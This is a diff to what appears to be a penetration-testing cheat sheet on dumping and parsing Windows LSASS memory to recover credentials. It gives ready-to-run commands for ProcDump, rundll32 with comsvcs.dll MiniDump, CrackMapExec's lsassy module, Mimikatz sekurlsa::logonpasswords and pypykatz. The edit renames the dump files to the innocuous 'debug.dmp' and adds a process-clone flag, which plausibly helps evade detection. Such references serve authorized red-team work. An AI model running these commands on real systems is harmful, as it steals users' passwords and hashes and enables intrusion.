@@ -213,10 +213,10 @@
 * GUI
    * `Task Manager > Details > lsass.exe > Create dump file`
 * ProcDump
-   * `procdump.exe -accepteula -ma <lsass_pid> lsass`
+   * `procdump.exe -accepteula -r -ma <lsass_pid> debug.dmp`
 * RunDLL
    * `Get-Process lsass`
-   * `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <pid> C:\Windows\Tasks\lsass.DMP full`
+   * `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <pid> C:\Windows\Tasks\debug.dmp full`
 * CME
    * `crackmapexec smb <ip_subnet> -u <user> -p <pass> -M lsassy`
 
@@ -231,9 +231,9 @@
 ## LSASS parsing
 
 * Mimikatz
-   * `.\mimikatz.exe "sekurlsa::minidump C:\Temp\lsass.DMP" "sekurlsa::logonpasswords" "exit" > lsass.txt`
+   * `.\mimikatz.exe "sekurlsa::minidump C:\Temp\debug.dmp" "sekurlsa::logonpasswords" "exit" > lsass.txt`
 * Pypykatz
-   * `pypykatz lsa minidump [-o lsass.txt] lsass.DMP`
+   * `pypykatz lsa minidump [-o lsass.txt] debug.dmp`
 
 
 ## Mimikatz
